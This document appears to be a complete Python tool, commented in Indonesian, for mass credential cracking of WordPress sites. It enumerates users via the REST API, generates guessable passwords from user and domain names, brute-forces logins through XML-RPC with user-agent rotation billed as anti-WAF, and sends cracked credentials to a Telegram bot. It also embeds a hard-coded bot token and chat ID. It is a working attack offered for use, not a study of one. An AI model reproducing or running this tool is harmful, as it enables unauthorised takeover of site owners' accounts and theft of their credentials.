import requests
import concurrent.futures
import urllib3
import sys
import random
import time
import re
from datetime import datetime
from requests.exceptions import ConnectTimeout, ReadTimeout, ConnectionError

# Matikan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI UTAMA ---
INPUT_FILE = 'list_domain.txt'
OUTPUT_FILE = 'pwned_results.txt'
THREADS = 50           
TIMEOUT = 15           
BATCH_SIZE = 40        
MAX_RETRIES = 2        

# --- KONFIGURASI TELEGRAM ---
TELEGRAM_TOKEN = "7994121895:AAEAr83U4UreqI7f0qsyFPzBUOkYOFaCvVY"
TELEGRAM_CHAT_ID = "6602672328"

IGNORED_SUBDOMAINS = ['cpanel', 'webmail', 'whm', 'webdisk', 'autodiscover', 'cpcalendars']

# --- WARNA TERMINAL ---
class Col:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    GREY = '\033[90m'
    RESET = '\033[0m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'

# --- FUNGSI NOTIFIKASI ---
def send_telegram_alert(domain, user, password_info):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID: return
    
    msg = (f"櫨 *WP CRACKED (Single Call)* 櫨\n\n"
           f"識 *Target:* `{domain}`\n"
           f"側 *User:* `{user}`\n"
           f"泊 *Pass:* `{password_info}`")
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=5)
    except: pass

def log(msg, status="INFO"):
    now = datetime.now().strftime("%H:%M:%S")
    colors = {
        "SUCCESS": Col.GREEN, "FAIL": Col.RED, "WARN": Col.YELLOW, 
        "SKIP": Col.GREY, "INFO": Col.CYAN, "FOUND": Col.BLUE,
        "DEBUG": Col.MAGENTA
    }
    print(f"{colors.get(status, Col.RESET)}[{status}] [{now}] {msg}{Col.RESET}", flush=True)

# --- ROTASI HEADER ---
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

def get_headers(target_url):
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'text/xml',
        'Accept': '*/*',
        'Connection': 'close',
        'Referer': target_url
    }

# --- LOGIKA PASSWORD ---
def generate_genius_passwords(user_data, target_url):
    clean_url = target_url.replace("http://", "").replace("https://", "").rstrip("/")
    domain_only = clean_url.split('/')[0]
    domain_parts = domain_only.split('.')
    domain_name = domain_parts[0] if len(domain_parts) > 0 else domain_only

    slug = user_data.get('slug', '').lower()
    real_name = user_data.get('name', '').lower()
    
    bases = set([slug, slug.capitalize(), domain_name, domain_name.capitalize()])
    if real_name and real_name != slug:
        parts = real_name.split()
        for p in parts:
            if len(p) > 2:
                bases.add(p)
                bases.add(p.capitalize())
        bases.add(real_name.replace(" ", ""))

    current_year = datetime.now().year
    years = [str(current_year), str(current_year-1), str(current_year-2)]
    separators = ["", "@", "#", "!", "_", "-"]
    suffixes = ["1", "12", "123", "1234", "12345"] + years

    passwords = []
    for base in bases:
        passwords.append(base)
        for sep in separators:
            for suf in suffixes:
                passwords.append(f"{base}{sep}{suf}")

    static_passwords = [
        "password", "123456", "12345678", "qwerty", "1234567890", 
        "admin123", "admin@123", "password123", "pass123", "admin",
        "welcome", "login", "master", "server", "webmaster"
    ]
    passwords.extend(static_passwords)
    passwords.append(domain_only) 
    return list(set(passwords))

def scan_wp_json_users(session, base_url):
    paths = [
        "/wp-json/wp/v2/users",
        "/wp/wp-json/wp/v2/users"
    ]
    
    for path in paths:
        target_json = f"{base_url}{path}"
        try:
            r = session.get(target_json, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10, verify=False)
            if r.status_code == 200:
                try:
                    data = r.json()
                    users = []
                    if isinstance(data, list):
                        for u in data:
                            if 'slug' in u:
                                users.append({'slug': u['slug'], 'name': u.get('name', '')})
                        root_path = target_json.split("/wp-json")[0]
                        xmlrpc_url = f"{root_path}/xmlrpc.php"
                        return True, users, xmlrpc_url
                except: pass
            elif r.status_code in [403, 401]:
                root_path = target_json.split("/wp-json")[0]
                xmlrpc_url = f"{root_path}/xmlrpc.php"
                users = [{'slug': 'admin', 'name': ''}, {'slug': 'administrator', 'name': ''}]
                return True, users, xmlrpc_url
        except:
            continue
    return False, [], None

def is_valid_domain(line):
    line = line.strip()
    if not line: return False
    if line.startswith("#") or line.startswith("import") or "=" in line or "{" in line: return False
    if "." not in line: return False 
    return True

def attack_domain(domain_raw):
    if not is_valid_domain(domain_raw): return
    
    raw_clean = domain_raw.replace('http://', '').replace('https://', '').strip('/')
    for sub in IGNORED_SUBDOMAINS:
        if raw_clean.startswith(f"{sub}."): return

    protocols = ['https://', 'http://']
    session = requests.Session()
    
    target_xmlrpc = None
    target_users = []
    found_via_json = False
    
    for proto in protocols:
        if found_via_json: break
        base_url = f"{proto}{raw_clean}"
        is_found, users, xml_url = scan_wp_json_users(session, base_url)
        if is_found:
            found_via_json = True
            target_xmlrpc = xml_url
            target_users = users
            log(f"WP Detected: {base_url} | Users: {len(users)}", "FOUND")

    if not found_via_json:
        for proto in protocols:
             if target_xmlrpc: break
             candidate = f"{proto}{raw_clean}/xmlrpc.php"
             try:
                 payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
                 r = session.post(candidate, data=payload, headers=get_headers(candidate), timeout=8, verify=False)
                 if r.status_code == 200 or "faultString" in r.text:
                     target_xmlrpc = candidate
                     target_users = [{'slug': 'admin', 'name': ''}, {'slug': 'administrator', 'name': ''}]
                     log(f"WP Detected (Direct): {candidate}", "FOUND")
             except: pass

    if not target_xmlrpc:
        log(f"No WP Found -> {raw_clean}", "SKIP")
        return

    wp_root = target_xmlrpc.replace("/xmlrpc.php", "")
    
    # --- MULAI BRUTEFORCE SINGLE CALL ---
    for user_obj in target_users:
        user_slug = user_obj['slug']
        pass_list = generate_genius_passwords(user_obj, wp_root)
        
        # Cek maksimal 100 password per user agar tidak terlalu lama
        for pwd in pass_list[:100]:
            safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            
            # Payload Single Call (Lebih aman dari block)
            payload = (
                f"<?xml version='1.0'?>"
                f"<methodCall><methodName>wp.getUsersBlogs</methodName>"
                f"<params>"
                f"<param><value><string>{user_slug}</string></value></param>"
                f"<param><value><string>{safe_pass}</string></value></param>"
                f"</params></methodCall>"
            )
            headers = get_headers(target_xmlrpc)
            
            try:
                response = session.post(target_xmlrpc, data=payload, headers=headers, timeout=TIMEOUT, verify=False)
                
                if response.status_code == 200:
                    if "isAdmin" in response.text or "blogName" in response.text:
                        log(f"CRACKED: {target_xmlrpc} | User: {user_slug} | Pass: {pwd}", "SUCCESS")
                        with open(OUTPUT_FILE, 'a') as f:
                            f.write(f"{target_xmlrpc}|{user_slug}|{pwd}\n")
                        send_telegram_alert(target_xmlrpc, user_slug, pwd)
                        return # Pindah ke domain berikutnya jika sudah cracked
                    elif "faultString" in response.text:
                        # Password salah, lanjut next password
                        continue
                    else:
                        # Status 200 tapi tidak ada isAdmin/blogName/faultString
                        # Ini biasanya WAF atau response kosong.
                        pass
                elif response.status_code in [403, 406, 503]:
                    # Jika diblokir keras, hentikan untuk user ini
                    break
            except:
                continue

def main():
    print(f"{Col.CYAN}--- WP GENIUS (Single Call Mode) ---{Col.RESET}")
    print(f"Logic: Single Request per Password (Anti-WAF)")
    
    try:
        with open(INPUT_FILE, 'r') as f: 
            domains = [line.strip() for line in f if is_valid_domain(line)]
    except: 
        print(f"File {INPUT_FILE} not found.")
        return

    random.shuffle(domains)
    print(f"Valid Targets: {len(domains)}")
    print("-" * 50)

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(attack_domain, domains)
    print("\n[DONE]")

if __name__ == "__main__":
    main()
